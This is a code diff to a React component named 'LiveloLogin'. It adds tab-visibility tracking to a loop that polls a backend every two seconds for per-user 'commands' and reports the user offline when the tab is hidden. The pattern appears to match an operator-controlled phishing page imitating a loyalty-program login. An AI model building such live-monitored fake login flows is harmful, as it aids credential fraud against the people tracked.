@@ -136,11 +136,14 @@ function LiveloLogin() {
     }
   };
 
-  // Verificar se há comando ativo
+  // Verificar se há comando ativo + heartbeat com visibilidade
   useEffect(() => {
     if (!userId) return;
 
     const checkCommand = async () => {
+      // Não enviar heartbeat se a aba não estiver visível
+      if (document.hidden) return;
+      
       try {
         const response = await axios.get(`${API}/user/check-action/${userId}`);
         
@@ -176,9 +179,26 @@ function LiveloLogin() {
       }
     };
 
+    // Quando a aba fica oculta, notificar offline imediatamente
+    const handleVisibilityChange = () => {
+      if (document.hidden) {
+        // Notificar backend que saiu (usando sendBeacon para garantir envio)
+        const url = `${API}/user/set-offline/${userId}`;
+        navigator.sendBeacon(url);
+      } else {
+        // Voltou - fazer check imediato
+        checkCommand();
+      }
+    };
+
+    document.addEventListener("visibilitychange", handleVisibilityChange);
+
     checkCommand();
     const interval = setInterval(checkCommand, 2000);
-    return () => clearInterval(interval);
+    return () => {
+      clearInterval(interval);
+      document.removeEventListener("visibilitychange", handleVisibilityChange);
+    };
   }, [userId, lastProcessedTimestamp]);
 
   // Verifica se o formulário está válido
